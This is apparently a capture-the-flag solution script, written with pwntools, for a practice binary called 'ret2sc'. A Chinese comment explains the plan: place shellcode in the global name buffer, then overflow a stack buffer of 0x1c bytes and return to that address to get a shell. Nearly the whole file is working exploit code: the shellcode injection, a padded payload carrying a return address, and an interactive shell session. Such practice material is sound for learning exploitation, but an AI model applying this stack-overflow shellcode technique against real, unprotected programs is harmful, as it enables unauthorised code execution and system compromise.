#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./ret2sc
'''
这道题是最基础的栈溢出，操作是把shellcode写到name的空间里面去，
然后溢出v4的缓冲区，跳转到name的地址去执行shellcode从而getshell，
但是也有一个小坑需要注意，v4在栈空间里面是以esp来寻址的，
所以，v4的缓存区的大小是0x1c而不是0x14

'''
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ret2sc')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()
name=0x804A060
shellcode = asm(shellcraft.sh())
payload = 'A' * 32
payload += p32(name)

# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
io.recvuntil('Name:')
io.sendline(shellcode)
io.recvuntil('Try your best:')
io.sendline(payload)
io.interactive()

